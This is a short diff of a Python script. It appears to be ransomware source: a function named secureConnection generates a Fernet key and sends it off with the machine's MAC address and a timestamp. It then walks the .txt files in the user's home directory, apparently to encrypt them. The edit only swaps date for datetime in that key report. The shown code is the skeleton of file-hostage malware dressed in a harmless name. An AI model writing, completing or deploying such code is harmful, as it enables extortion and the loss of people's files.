@@ -9,7 +9,7 @@ import signal
 import paramiko
 from cryptography.fernet import Fernet
 from uuid import getnode as get_mac
-from datetime import date
+from datetime import datetime
 
 
 homeDirectory = str(os.getenv("HOME"))
@@ -39,7 +39,7 @@ def getStat():
 def secureConnection():
     key = Fernet.generate_key()
     sendKey(key + "\t".encode("ascii") + bin(get_mac()).encode("ascii") + "\t".encode("ascii") +
-            str(date.today()).encode("ascii"))
+            str(datetime.now()).encode("ascii"))
 
     for file in os.listdir(os.path.expanduser(homeDirectory)):
         if file.endswith(".txt"):
